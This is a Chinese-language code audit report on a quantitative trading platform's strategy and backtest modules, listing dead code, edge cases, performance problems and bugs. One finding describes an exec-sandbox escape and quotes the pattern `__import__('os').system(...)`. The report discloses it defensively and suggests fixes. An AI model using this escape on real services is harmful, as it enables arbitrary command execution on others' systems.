# 04 strategy + backtest 模块审查报告

> 审查基准日期：2026-08-14
> 审查方式：只读静态代码审查（grep 交叉验证 + 逐文件通读 + 4 个子代理并行深读大型策略类与 services/managers），未修改任何业务代码。
> 审查文件清单（数量统计）：
> - `modules/strategy/`：策略类 4 文件（`strategies/etf/bottom_strategy.py`、`strategies/reference/stock_low_high_strategy.py`、`strategies/rotation/GlobalRotationV2AggressiveStrategy.py`、`strategies/rotation/high_vol_momentum_strategy.py`，共 5 个策略类含内部基类）+ 基类/上下文 2 文件；engines 6 文件（strategy_manager、data_feed_engine、performance_tracker、capital_allocator、engine_factory、strategy_registry）；services 9 文件；managers 2 文件；utils 2 文件；根文件 3 文件（constants/models/handlers）。小计 28 个 .py。
> - `modules/backtest/`：engines 6 文件（backtest_engine、backtest_broker、simulation_engine、optimization_engine、report_engine、sizer）；analyzers 3、services 3、managers 2、optimizers 3、simulators 3、utils 2、tasks 2、根文件 3（handlers/schemas/models）。小计 27 个 .py。
> - 合计 55 个 Python 文件；本报告共 110 项实证发现（死代码 32、边界 30、性能 14、业务/安全 34，含交叉维度）。

## 0. 审查范围与方法

- **范围 A（策略模块）**：`modules/strategy/strategies/` 全部策略类（LightGBMBottomStrategy、StockLowHighStrategy、GlobalRotationV2AggressiveStrategy、HighVolMomentumStrategy 及基类/上下文）、`engines/`（StrategyManager、DataFeedEngine、PerformanceTracker、CapitalAllocator、StrategyRegistry、EngineFactory）、`services/`、`managers/`、`utils/`、`constants/models/handlers`。
- **范围 B（回测模块）**：`modules/backtest/engines/`（BacktestEngine、BacktestBroker、SimulationEngine、OptimizationEngine、ReportEngine、Sizer）、`analyzers/`、`services/`、`managers/`、`optimizers/`、`simulators/`、`utils/`、`tasks/`、`handlers/schemas/models`。
- **方法**：① 逐文件通读核心链路（信号 → Sizer → Broker → 绩效）；② grep 交叉验证死代码引用、`shift(-1)`/`iloc[i+1]` 前视模式、ATR 除零防护、关键 API 调用方；③ 4 个子代理并行深读大型策略类与 services/managers 文件；④ 对不确定项标注"待确认"。
- **约束**：只读审查，未修改任何业务代码，唯一写操作为本报告文件。

**发现数量统计（按维度）**

| 维度 | 高 | 中 | 低/待确认 | 小计 |
| --- | --- | --- | --- | --- |
| 死代码 | 0 | 0 | 32 | 32 |
| 边界情况 | 7 | 17 | 6 | 30 |
| 性能 | 1 | 5 | 8 | 14 |
| 业务闭环与 bug（含安全） | 11 | 17 | 6 | 34 |
| 合计 | 19 | 39 | 52 | 110 |

> 注：§2-§5 各表共 110 行实证条目，与上文"110 项实证发现"对应；§6 Top 20 为其子集。

## 1. 业界对比分析

**撮合真实性（对照 vectorbt / backtrader / zipline）**
- T+1 制度：`modules/backtest/engines/backtest_broker.py:1247-1253` 当日买入锁定、次日 `mark_to_market:954-959` 统一解锁，等价于"买入 T+1 成交、T+2 可卖"，符合 A 股语义。**但**卖出方向校验（`:328-332`）用的是总持仓而非可卖数量，配合 close/trigger 当日成交模式（`settle_intraday_orders:847-912`）存在当日卖出当日买入股份的 T+1 漏洞（见 §3-1、§5）。
- 涨跌停：`_can_trade:1279-1328` 支持主板 ±10%/科创板 688 ±20%/ST ±5%，涨停不买、跌停不卖，优于 backtrader 默认。**但** trigger 模式（止损单）跳过涨跌停门（`:669`、`settle_intraday_orders:880-885` 注释明确"无条件当日成交"）——跌停日止损单仍可成交，与真实"跌停无法卖出"不符（有意的近似，注释已说明，但应在报告中披露）。
- 滑点：固定比例（买入 ×(1+s)、卖出 ×(1-s)），无成交量冲击模型（对比 vectorbt 的 volume-aware 模型）；`simulators/slippage_simulator.py:67` 有随机噪声但仅用于未接入链路的 SimulationEngine，主链路确定性可复现。
- 费用：佣金+印花税（仅卖出 0.1%）+过户费（0.002%）齐备，但 `BacktestBrokerConfig.min_commission=0.0`（免五）与 docstring"最低佣金 5 元"矛盾（`:195` vs `:30-31`）——真实 A 股有 5 元最低佣金，回测对微额交易低估成本。
- 成交量约束：**无**（大单按委托量全额成交，不校验当日成交量/流动性），对比 zipline 的 volume bar 限制，回测可能高估冲击后成交可能性。
- 停牌/缺数据：挂单保留并 20 个交易日后过期取消（`backtest_broker.py:631-648`），处理完整。

**前视偏差防护（shift(-1) 禁止项）**
- 全量 grep 验证：`modules/strategy/` 与 `modules/backtest/` 无 `shift(-1)`/`iloc[i+1]`（仅 `modules/data/tasks/research_tasks.py:144,1367` 在研究任务中，不在本审查范围）。
- 撮合时序正确：`backtest_engine.py:501-549` 顺序为 match_orders（昨日单今日 open 成交）→ handle_bar_batch（今日信号）→ submit_order → settle_intraday → mark_to_market，信号默认 T+1 成交，无当日信号当日 open 成交的前视。
- 风险点 1：close/trigger 当日成交模式依赖策略自律（决策用当日 close/low 后当日收盘成交属"收盘决策"，可接受；但 GlobalRotationV2 `_preload_history:158-183` 在回测中加载至真实今天，靠 `_is_fresh:337` 与 `_append_data:553-558` 时序守卫挡住未来数据——设计脆弱，建议回测模式禁用 DB 预热，见 §3-12）。
- 风险点 2：`bottom_strategy.py:263-291` `_load_factor_cache` 一次性加载全历史因子，若因子由前复权价事后重算，存在数据源级前视（非代码问题，待数据侧确认）。

**性能（逐日循环 vs 向量化）**
- 引擎为 Backtrader 风格逐日循环（`iter_bars` 按交易日分组推 BarData），对日线中低频可接受；但策略层存在多处 O(n²)：`stock_low_high_strategy.py:1952-1957` 逐日全量 concat、`high_vol_momentum_strategy.py` 与 `GlobalRotationV2AggressiveStrategy.py:576` 逐 bar `pd.concat`（见 §4）。
- 数据加载为批量 SQL（`data_feed_engine.py:679-698` `_load_adj_batch` 一次 IN 查询），优于逐股循环；但 `iter_bars:468` 仍逐行构造 BarData（iterrows）。

**策略基类生命周期**
- `base_strategy.py` on_init/on_start/on_bar/on_stop + 可选 on_tick，与 backtrader Strategy 对齐；`on_bar_batch_end` 为鸭子类型调用（`strategy_manager.py:682-698`），未在基类声明/文档化，新策略易遗漏。`initialize()/start()/stop()` 兼容 sync/async，处理完整。
- 与 zipline 的 Bundle/Calendar 相比，本框架无显式交易日历对象注入策略，交易日推进由数据驱动（有数据才 yield），对"决策日是否交易日"的显式语义弱化（见 §3-14 补跑逻辑）。

**性能结论（逐日循环 vs 向量化）**
- 引擎骨架（逐日循环 + 批量 SQL 加载 + 复权 JOIN）对 A 股日线中低频（≤50 标的 × 5 年 ≈ 6 万行）完全够用；若扩展到全市场 5000 标的 × 5 年 ≈ 600 万行，则 `iter_bars` 逐行 BarData 构造与策略层 O(n²) concat 会成为瓶颈，届时需借鉴 vectorbt 的向量化信号矩阵 + 事件驱动撮合混合架构。
- 优化场景（grid 搜索数百次全量回测）当前实现既慢又不正确（§4-7、§5-3），是性能与正确性双重短板。

**Sizer 模式**
- 三层分离 Strategy→Sizer→Broker 与 Backtrader Sizer/QuantConnect PortfolioConstruction 对齐，`select_sizer` 自动选择（`sizer.py:184-220`）。**关键缺陷**：`TradingSignal.weight` 默认 1.0（`models.py:99`）导致无 quantity/amount 的裸信号恒走 WeightSizer 按 100% 资金买入，FixedAmountSizer 分支不可达（见 §5-9）。

**与业界框架能力对照表**

| 能力点 | 本实现 | backtrader | vectorbt | zipline | 差距结论 |
| --- | --- | --- | --- | --- | --- |
| T+1 制度 | 有（买入次日解锁） | 无内建 | 无内建 | 有 | 达标，但可卖校验有洞（§3-1） |
| 涨跌停 | 有（主板/科创/ST 自动识别） | 无 | 无 | 无 | 超出同业；trigger 单跳过属简化 |
| 滑点 | 固定比例 | 支持自定义 | 支持多模型 | 支持 | 缺成交量冲击模型 |
| 费用 | 佣金+印花税+过户费 | 佣金可配 | 可配 | 佣金+滑点 | 免五与 5 元最低佣金矛盾 |
| 成交量约束 | 无 | 无 | 有 | 有 | 高估大单成交可能 |
| 前视防护 | T+1 成交 + 无 shift(-1) | 用户自律 | 用户自律 | 日历对齐 | 需防 DB 预热泄漏（§3-10） |
| 回测驱动 | 逐日循环（Backtrader 风格） | 逐日循环 | 向量化 | 逐日循环 | 日线中低频够用 |
| Sizer 体系 | 5 种 + 自动选择 | FixedSize/自定义 | — | — | 与 Backtrader 对齐，但默认权重有坑（§5-9） |

## 2. 死代码清单

| 位置(文件:行) | 类型 | 说明 | 清理建议 |
| --- | --- | --- | --- |
| modules/strategy/utils/strategy_loader.py:37-442 | 整类未使用 | StrategyLoader 全库无引用（grep 仅自身与 utils/__init__ 导出） | 删除，统一走 StrategyRegistry |
| modules/strategy/utils/strategy_loader.py:56-69 | 失效引用 | `_predefined_paths` 指向已删除的 technical/alpha/ai 目录模块 | 删除 |
| modules/backtest/tasks/backtest_tasks.py:18-126、optimization_tasks.py:16-98 | 整类未使用 | BacktestTask/OptimizationTask 无任何实例化（仅 __init__ 导出） | 删除 |
| modules/backtest/utils/data_loader.py:35-70 | stub | load_market_data 恒返回空 DataFrame（注释自认"暂时返回空"） | 删除或实现 |
| modules/backtest/engines/backtest_engine.py:1442-1497、1548-1622、1624-1678、1684-1720 | 旧接口兼容层 | register_strategy/load_strategy/initialize_strategy/run_backtest/calculate_metrics/run_parallel_backtests 无调用方（主链路走 StrategyManager） | 删除或标注 @deprecated |
| modules/backtest/engines/backtest_engine.py:1813-1878 | 旧接口辅助 | _calculate_max_drawdown/_calculate_sharpe_ratio 仅旧接口使用 | 随旧接口删除 |
| modules/backtest/engines/backtest_broker.py:1351-1357 | 空实现 | _on_order_submitted 为 pass，还订阅了字符串事件 | 删除订阅与实现 |
| modules/backtest/engines/simulation_engine.py:146-365 | 未接入链路 | BacktestService 创建后从不调用；account["initial_capital"] 从未赋值 → calculate_metrics:341 恒除零 | 删除或接入并修复资金初始化 |
| modules/backtest/engines/report_engine.py:106-266 + analyzers 3 文件 | 半失效链路 | 报告管线 metrics 键与 BacktestResult.to_dict 扁平结构不匹配（见 §5-7），ReportService 无 router 引用（待确认路由） | 修复键映射或整体删除 |
| modules/backtest/managers/task_manager.py:20-177、resource_manager.py | 未接入 | 无 router 实例化；cancel_task:143 引用 optimization_tasks 表（DB 无此表则报错） | 删除或接入统一任务调度 |
| modules/strategy/engines/engine_factory.py:49-127 | 恒回退 | 注册表恒空（CTA/Alpha/AI 引擎已删），create_engine 恒返回 StrategyManager；strategy/__init__.py:188 创建后仅注册 | 删除或简化 |
| modules/strategy/strategies/etf/bottom_strategy.py:601-604、139、316-319 | 死分支 | _on_bar_trace 从未被调用；except NameError 恒不触发；"非池代码重载因子"分支不可达 | 删除 |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:52、512-524 | 死分支 | US_PAIR=[] 使 _pick_us_etf 恒返回 None，434-438 US 分支恒不执行 | 删除 US 分支 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py | 死成员 | _is_st_by_prefix、_stock_pool、_first_screen_done（只写不读）、_count_recent_limit_ups 注释残留 | 删除 |
| modules/strategy/engines/strategy_manager.py:1819 | 无效计算 | trigger_strategy 中 `valid=[...双 if 列表推导]` 调用 validate_signal 两次且结果未使用（有效逻辑在 1821-1827） | 删除该行 |
| modules/strategy/engines/performance_tracker.py:53-54 | 空分支 | `if hasattr(trade_date,'strftime'): pass` | 删除 |
| modules/strategy/services/portfolio_service.py | 全文件 stub | 组合服务方法不落库（子代理确认），业务闭环缺失 | 实现或删除 |
| modules/strategy/utils/parameter_validator.py | 零调用 | 全仓 grep 无引用，参数校验路径实际不存在；且 get_default_schema 仅覆盖 alpha/cta/mean_reversion，其余类型 schema={} 全通过 | 接入或删除 |
| modules/strategy/handlers.py:515 | 重复语句 | return 后重复一行 return | 删除 |
| modules/backtest/analyzers/risk_analyzer.py:203 | 计算错误 | alpha = annualized_return - beta*0 恒等于 annualized_return | 修复或删除 |
| modules/backtest/simulators/market_simulator.py:99-121 | 伪实现 | get_price 忽略 symbol/timestamp 恒返回最后一行 close | 随 SimulationEngine 处理 |
| modules/strategy/constants.py:223-230 | 未使用枚举 | OrderType.ICEBERG/TWAP/VWAP/STOP_LIMIT 无实现 | 保留待扩展或删除 |
| modules/backtest/engines/data_feed_engine.py:590-618 | 参数未使用 | get_available_symbols 的 min_days 参数从未参与过滤（恒返回全部活跃股） | 实现过滤或删参数 |
| modules/strategy/strategies/etf/bottom_strategy.py:545 | 门槛失效 | P4 确认条件 `bar.close > signal_low`（次日收盘>前日最低）几乎恒成立，确认门槛形同虚设 | 收紧确认条件（如量能+幅度双条件） |
| modules/strategy/strategies/etf/bottom_strategy.py:541-549 | 状态残留 | P4 未确认/量能失败时仅 pop 内存缓冲，DB pending_confirm 不标记 expired → 重启后 _restore_candidates_from_db（:432-471）复活陈旧候选（过期守卫 :454 只挡 >5 天） | 失败即写 expired 状态 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:1724-1729、241、245/427/611 | 未使用成员 | _is_st_by_prefix 从未被调用（ST 过滤实际走 on_start 名称判定）；_stock_pool 只初始化从不读写；_first_screen_done 只写不读；1811-1813 注释引用的旧版 _count_recent_limit_ups 方法已不存在 | 删除 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:1282-1295、1817-1932、666 | 默认关闭的死分支 | entry_close_in_range=0 使条件 0 分支恒不生效；pump_dump_filter_enabled=False 使 _detect_pump_and_dump（约 110 行）直接返回；bear_max_pos 赋值后立即被 regime_no_new_buy 拦截永不生效（注释自认） | 删除或经参数显式启用 |
| modules/strategy/strategies/rotation/high_vol_momentum_strategy.py:181/202/723、182/203、186/206/291 | 未使用成员 | _nav_realized 只写不读；_peak_return 从不更新（StrategyManager 恢复时读恒 -999.0）；_first_screen_done 只写不读 | 删除或接入实际使用 |
| modules/strategy/strategies/rotation/high_vol_momentum_strategy.py:922、937、948、951 | 未使用方法 | generate_entry_signals/generate_exit_signals 全库无调用者；calculate_position_size/check_stop_profit_stop_loss 仅测试调用，且后者只实现硬止损无移动止盈 | 删除或补测试接入 |
| modules/strategy/managers/dependency_manager.py:199-245 | 未解析的依赖注册 | DATA/SIGNAL/RESOURCE 依赖仅存储不解析；CIRCULAR/RESOLVED 状态从未使用 | 实现解析或删除 |
| modules/strategy/services/industry_scoring_service.py（validate()/factor_vector） | 无人消费 | validate() 与 factor_vector 全库无调用者 | 接入或删除 |

## 3. 边界情况清单

| 位置 | 触发场景 | 现状行为 | 风险等级 | 修复建议 |
| --- | --- | --- | --- | --- |
| modules/backtest/engines/backtest_broker.py:313-332、847-912 | close/trigger 当日成交模式 + 当日先买后卖 | 卖出校验用总持仓 quantity 而非 available_quantity，同日买入股份可被当日卖出（T+1 失效） | 高 | 校验改用 available_quantity；settle 前复核可卖量 |
| modules/backtest/engines/backtest_broker.py:1266-1277 | 同一标的同一天提交两笔卖出单 | 两笔均在提交时通过（都看到满仓），次日第一笔成交删仓后第二笔无持仓校验直接入账 → 超卖 + 现金虚增 | 高 | 成交时校验 pos 存在且 quantity ≥ 卖量，不足则取消 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:1207-1211 | 数据含 NaN | `price<=0` 守卫对 NaN 无效，_nav_realized 被 NaN 永久污染，portfolio_dd_limit 回撤保护失效 | 高 | math.isfinite 显式过滤 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:1067 | closes 不足 21 或含 0 | `closes[-21]` 除零无防护且无 try → 中断当日整个调仓 | 高 | 分母守卫 + try/except |
| modules/strategy/strategies/etf/bottom_strategy.py:636、659 | 入场 bar.close=0 或 NaN | entry_price=0 除零崩溃；NaN 使全部比较恒 False → 持仓永不退出（位置泄漏）；且 _check_exit 不在 on_bar 的 try 内（仅 :563-597 新预测段有 try），异常上抛计入 manager 逐 bar 错误 | 高 | 入场价守卫 + 退出计算 NaN 防护 + 包裹 try |
| modules/strategy/strategies/rotation/high_vol_momentum_strategy.py:607 | 价格 NaN | NaN 全链路无防护（`NaN<=0` 为 False）：ATR NaN 使 :655 `atr<=0` 守卫失效 → :664 hard_stop=NaN 止损静默失效；:607 `int(NaN)` 抛 ValueError 丢当日全部信号；:466 atr==0 时 `0/price` 穿透"波动温和"过滤 | 中 | 全链 np.isfinite 过滤 |
| modules/strategy/strategies/etf/bottom_strategy.py:645-651 | atr_ratio_20=None | f-string `:.1%` 对 None 抛 TypeError → 止损信号生成失败、持仓不清理 | 中 | None 判空 |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:503 | closes 含 0/NaN | np.diff 除零产生 inf/nan，-inf 误触发跳水惩罚 | 中 | 过滤无效值后再计算 |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:617-619 | 停牌/缺 bar 致 price<=0 | _make_exit_signal 返回 None → 持仓状态卡死，每日重试永不退出 | 中 | 退出信号价格兜底（用 last close） |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:158-183 | 回测中 DB 预热 | _preload_history 加载至真实今天，未收 bar 的代码缓存保留未来数据（当前靠 _is_fresh 挡住） | 待确认 | 回测模式禁用 DB 预热 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:896 | 停牌候选股 | 用缓存陈旧 close 确认买入（无当日 bar 新鲜度守卫），决策价≠次日开盘成交价 | 中 | 确认前校验 bar 日期==当日 |
| modules/backtest/engines/backtest_broker.py:952 | 停牌持仓当日无 bar | mark_to_market 跳过重估，市值冻结在上期 | 中 | 用前收/最新价兜底并记录 |
| modules/strategy/strategies/etf/bottom_strategy.py:342 | threshold≥1 | _calc_weight 分母 (1.0-threshold) 除零（无 _validate_params，对比 rotation 策略有） | 低 | 参数校验 |
| modules/strategy/engines/strategy_manager.py:1914-1929 | 节假日 | _get_missed_trading_days 用 weekday<5 而非交易日历 → 节假日被当缺失日补跑 | 低 | 用 TradingCalendar |
| modules/backtest/engines/backtest_engine.py:460-462 | 回测区间无数据 | 返回空 BacktestResult，无日志区分"无数据"与"策略无信号" | 低 | 增加数据为空日志与状态标记 |
| modules/backtest/engines/data_feed_engine.py:464-494 | 某日部分标的数据缺失 | 直接跳过缺数据标的，交易日历不对齐 | 低 | 与交易日历对齐并补零/前值 |
| modules/strategy/strategies/etf/bottom_strategy.py:612 | 回测资金口径 | context.available_capital 恒等于 initial_capital（真实资金在 broker.cash 且不回流）→ 数量计算脱离实际可用资金；且 :618 `max(int(amount/price/lot)*lot, lot)` 强制最小 1 手，超权/超资金仅靠 broker 缩减兜底，实际权重偏离信号意图 | 中 | 引擎逐日把 broker.cash 写回 context；按可用资金封顶 |
| modules/strategy/engines/strategy_manager.py:1390-1397 vs data_feed_engine.py:84-104 | ETF 判定不一致 | strategy_manager._is_etf 用 `.OF` 后缀或 51/56/58/15 前缀；data_feed_engine._is_etf 用 51/159/16/56/58 前缀 → 同一代码两处路由结果可能不同（如 159xxx 在 manager 匹配 15，16xxxx 在 manager 不匹配） | 中 | 抽取公共 is_etf 工具统一两处 |
| modules/strategy/engines/strategy_manager.py:726-731 | 信号去重误删 | `state.pending_signals = [s for s in ... if s not in strategy_signals]` 基于 dataclass 相等性过滤，相同字段的不同信号可能被一并清除 | 低 | 按信号 id 过滤 |
| stock_low_high_strategy.py:932-933、954-955 | 资金不足 | 买入 shares 按 capital×weight 硬算并记入 _holdings，broker 资金不足会缩减/拒绝成交（backtest_broker.py:516-530、466-478）后内部份额/weight 与实际持仓发散，:963-966 仍打印"买入成功" | 中 | 成交反馈回写 _holdings（按实际成交数量） |
| stock_low_high_strategy.py:1573-1576 | 零持仓卖出幻觉盈亏 | 无持仓时 engine 跳过下单（sizer CloseAllSizer），但 _finalize_exits 仍把幻觉 pnl 乘入 _nav_realized | 中 | 卖出结算前校验 _holdings 存在，无则跳过 |
| stock_low_high_strategy.py:1322（1349） | closes[-11] 为 0/NaN | 除零被 except 静默吞掉，该股被静默剔除且无日志（对比 1301/1318/1473 有防护，此处漏网） | 低 | 显式分母守卫 + 记录剔除原因 |
| stock_low_high_strategy.py:860-869 | _gap<=0（同日/未来）且 _last_trade_date 停滞 | 候选写回待次日但永不过期、不确定，卡死在 pending | 低 | 增加过期/强制确认守卫 |
| high_vol_momentum_strategy.py:588、720、903 | 停牌股陈旧价结算 | _confirm_pending_buys/_finalize_exits/_make_exit_signal 用 _get_price 不检查当日有无 bar（选股路径 :420/489 有新鲜度检查，此处缺失）→ 按最后收盘价确认买入/结算，决策价≠成交价 | 中 | 复用选股路径的新鲜度守卫 |
| high_vol_momentum_strategy.py:575-578 | 资金口径 | 入场资金按 initial_capital 固定值计算，不随 broker 实际现金变化；quantity>0 走 QuantitySizer 绕过 WeightSizer 费用缓冲且无现金封顶 | 中 | 资金取 broker.cash 并封顶校验 |
| high_vol_momentum_strategy.py:521 vs 444 | 牛熊窗口口径不一致 | 牛市创新高窗口含当日（highs[-20:]），熊市排除当日（highs[-21:-1]），两路径判定基准不同（非前视，但口径不一致影响可比性） | 低 | 统一窗口定义并注释 |
| GlobalRotationV2AggressiveStrategy.py:249 | 停牌/缺 bar 日跳过止损检查 | _daily_risk_check 对 _is_fresh=False 标的直接 continue → 当日无止损检查，缺口风险 | 中 | 停牌日用最后可得价继续风控或显式挂起 |
| GlobalRotationV2AggressiveStrategy.py:337-339、360-363 | 缺一天 bar 即误卖持仓 | rebalance 中不新鲜标的被踢到防御仓 → old_codes-new_codes 生成"调仓退出"卖出信号，数据管道缺一天即误卖（与 :617-619 卡死互为极端） | 中 | 缺 bar 仅跳过该标的调仓，不生成退出信号 |
| industry_scoring_service.py:525-536 | 横截面归一化 NaN | 归一化分母/求和遇 NaN 无防护，单个 NaN 标的污染整个横截面分数 | 中 | 归一化前 isfinite 过滤 |
| etf_industry_mapper.py:289-291、301-306 | 数据不足放行 + 单位矛盾 | 行业数据不足 5 天即放行交易（无最低数据门槛）；amount 单位注释与实现矛盾 | 中 | 数据门槛校验 + 统一单位 |

## 4. 性能问题清单

| 位置 | 问题 | 影响 | 优化建议 |
| --- | --- | --- | --- |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:1952-1957 | _data_cache 逐日 concat 全量 DataFrame（raw_cache 250 行上限不作用于拼接结果） | 5 年回测 O(总行数²) 累积拷贝，内存/时间爆炸 | 按日 append 到 list，定量再构建 DataFrame |
| modules/strategy/strategies/rotation/high_vol_momentum_strategy.py（_append_data:1017-1023） | 逐 bar pd.concat+tail 二次拷贝重建 DataFrame | O(n²) 累积，全市场约 72 万次 | list 追加 + 仅尾部窗口 |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:576 | 同上逐 bar concat | O(n²) 累积 | list 追加 |
| modules/strategy/strategies/etf/bottom_strategy.py:299-303、320 | _get_factor_value 每次全量 sorted(cache.keys(), reverse=True)，on_bar 每 bar 多次调用 × 25 ETF | 每 bar 多次 O(N log N) | 缓存排序后的日期列表 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py | 每日两遍全市场扫描，MACD/MA 无跨日缓存复用 | 全市场回测慢 | 指标预计算缓存 |
| modules/strategy/engines/strategy_manager.py:1243-1370 | _load_daily_bars_range 无缓存；预热与正式回测各加载一份 | 预热+回测双份全量数据加载 | 预热结果复用/缓存 |
| modules/backtest/engines/optimization_engine.py + optimizers/grid_search.py:56-59 | asyncio.gather 无并发上限，全部参数组合同时并发回测，共享同一 AsyncSession 与同一策略实例 | 竞态（session 并发查询报错、参数污染）+ 资源耗尽 | 限并发 + 每评估独立 session/独立策略实例 |
| modules/backtest/engines/data_feed_engine.py:468 | iter_bars 逐行 iterrows 构造 BarData | 大数据量下构造开销 | 批量构造/向量化 |
| modules/strategy/engines/strategy_manager.py:2305-2318、2435-2445 | 每策略预热后强制 gc + malloc_trim 归还内存 | 高频率内存回收抖动（非 Windows 已兜底） | 按需触发 |
| modules/strategy/engines/strategy_manager.py:1091-1241 | 实盘每日 _load_daily_bars 全市场扫描（无 symbols 时一次拉全市场并逐行转 BarData），多策略重复执行 | 全市场实盘驱动延迟 | 按策略股票池过滤 + 结果缓存复用 |
| modules/strategy/strategies/etf/bottom_strategy.py:563-597 | on_bar 每 bar 对 25 只 ETF 依次调用模型预测（_predict），无批次化 | 每 bar 25 次模型前向 | 按日批量预测一次 |
| stock_low_high_strategy.py:606、643 | on_bar_batch_end 与 _run_rebalance 同日两次调用 _build_dataframe_cache，第二次空转 | 冗余构建 | 幂等短路/去重 |
| stock_low_high_strategy.py:1276、1310 | _passes_screen 等仅用尾部 20-35 行，却复制并保留全历史 _data_cache | 内存浪费 | 按需保留滑动窗口 |
| composite_service.py:452-457、533-534 | 成员循环内逐项 DB 查询（N+1） | 组合策略成员多时 DB 往返放大 | 批量查询 + 缓存 |

## 5. 业务闭环与 bug 清单

| 位置 | 问题描述 | 严重度(高/中/低) | 修复建议 |
| --- | --- | --- | --- |
| modules/strategy/engines/strategy_manager.py:183-199、modules/backtest/services/backtest_service.py:1631-1637 | **exec 任意代码执行（RCE）**：所谓"沙箱"仅移除 eval/exec/compile/open/input/breakpoint，保留 `__import__` 与完整 builtins/module 系统，`__import__('os').system(...)` 或 `import os` 均可执行任意命令；且代码在服务启动 `_recover_running_strategies:1992-2062` 与策略启动时对 DB 中 strategies.code 自动 exec（无人工审批），Web 编辑器保存的代码即可触发 | 高 | 移除 __import__、注入受限 import hook、AST 白名单校验；或改为独立低权限子进程执行；DB 代码变更需审批/签名 |
| modules/strategy/engines/performance_tracker.py:83 + services/performance_service.py:83-84 | 绩效追踪调用 calculate_daily_performance 未传 total_assets → 恒为 0 → 每笔写入 daily_return=-100%（"幽灵绩效"），污染 strategy_daily_performance 实盘绩效表；且返回 dict 与表均无 total_assets 列（:89 prev 分支恒假）、:63-66 按不存在的 strategy_run_id 过滤致 sharpe 恒 None、:114-122 回撤只比最近两日且存正值而读取方按负值聚合（口径冲突） | 高 | 从账户/持仓市值计算总资产后传入；补 total_assets 列与 run_id；统一回撤正负口径 |
| modules/backtest/engines/optimization_engine.py:199-211 | objective 中 `_strategy_instances`/`_strategy_registry` 恒空（该引擎内部 BacktestEngine 从未注册策略）→ 每次评估返回 -inf，参数优化结果无意义（grid 返回首组合） | 高 | 优化前将策略类注册进 optimization 引擎的 backtest_engine |
| modules/backtest/engines/backtest_engine.py:415-421 + services/backtest_service.py:271-276 | broker 注入时（标准路径），run() 的 commission_rate/slippage 参数被丢弃（broker_config 仅用于新建 broker），任务级费率配置（backtest_parameters 表）不生效 | 高 | run() 前用入参覆盖 broker.config 对应字段 |
| modules/backtest/engines/backtest_engine.py:505-512 | manager 为 None 时 `signals` 未初始化 → UnboundLocalError 崩溃（`if manager:` 守卫暗示允许 None） | 中 | 循环前 `signals = []` |
| modules/backtest/engines/backtest_engine.py:611-612、915-916 | risk_violations 从 self.broker 收集，但实际撮合用局部 broker → 自动创建 broker 时风控违规明细丢失 | 中 | 统一用局部 broker 变量 |
| modules/strategy/handlers.py:584-613 | _fetch_real_performance 读 task.result["metrics"]，而 BacktestResult.to_dict() 是扁平结构 → 策略绩效接口恒返回全 0 | 高 | 改读扁平键（total_return/annual_return 等） |
| modules/backtest/services/backtest_service.py:379-394 vs 1283 | 创建任务时 snapshot_strategy_version 记录版本快照，但 run_backtest 用 strategies.code 当前代码执行 → 回测结果与创建时版本不一致；实盘 _publish_signals:861 的 version_id 也恒空（StrategyInstance 未设置 current_version_id） | 高 | 回测执行时读取快照 code_content 执行；实盘注入版本号 |
| modules/strategy/models.py:99 + backtest/engines/sizer.py:209-218 | TradingSignal.weight 默认 1.0 → 无 quantity/amount 的裸信号恒选 WeightSizer 按 100% 资金买入；FixedAmountSizer 分支不可达、amount 被忽略 | 高 | weight 默认 None；select_sizer 优先 amount 分支 |
| modules/strategy/models.py:129-160 | to_dict() 未序列化 order_mode/trigger_price/weight（StrategySignalEvent 亦无这些字段）→ 实盘信号链路丢失 trigger/close 执行信息 | 中 | to_dict 补字段 + StrategySignalEvent 加字段 |
| modules/strategy/strategies/reference/stock_low_high_strategy.py:25-26 vs backtest_engine.py:546-547 | 策略文档声称"信号 T+1 撮合"，实际 close/trigger 信号当日成交，而内部账本 _finalize_exits 次日结算 → portfolio_dd_limit 回撤保护失真；半仓退出收益不入 _nav_realized（:1624-1645）；且 T 日 _calc_portfolio_return（:1203）把 _exit_pending 持仓按 close[T] 重复计入浮动盈亏一天 | 中 | 统一账本与撮合口径 |
| modules/strategy/strategies/etf/bottom_strategy.py:525 vs 473-479 | 重启后 DB 恢复持仓只注入 _active_positions，_position_entry 未同步 → 恢复持仓无止损/止盈/到期退出，max_positions 检查失效可能重复买入 | 高 | 恢复时同步 _position_entry/_track_high |
| modules/strategy/strategies/rotation/high_vol_momentum_strategy.py | 实盘重启后 _holdings 不恢复（on_start 清空、load_live_state 只恢复候选）；持仓满时候选被静默丢弃（_buy_pending.clear() 在 break 前）且 DB pending_confirm 行永留（前端卡"待确认"） | 中 | 恢复 _holdings；先 break 后 clear；失败写 expired |
| modules/strategy/strategies/etf/bottom_strategy.py:393-401 | _persist_candidate 读从未定义的 _last_trade_date → live 下 signal_time 退化为 datetime.now() | 中 | 定义/维护该属性 |
| modules/strategy/strategies/rotation/GlobalRotationV2AggressiveStrategy.py:607-608 | 入场信号 quantity=0、amount=1.0 伪值：回测由 WeightSizer 计算可成交，实盘 trade 链路要求 quantity>0 → 实盘拒单，回测/实盘行为不一致 | 高 | 实盘/回测统一数量计算 |
| bottom_strategy.py:633-663、GlobalRotationV2AggressiveStrategy.py:261-288 | 止损/止盈信号未设置 trigger_price/order_mode="trigger" → 默认次日开盘成交，隔夜跳空无法控损 | 中 | 设置 trigger 模式 |
| modules/strategy/engines/strategy_manager.py:971-985 | update_strategy_capital 将 total_assets 直接覆盖为 allocated_capital，忽略已有持仓市值 → 资产口径失真 | 中 | 只更新 available_capital，total_assets 由持仓+现金重算 |
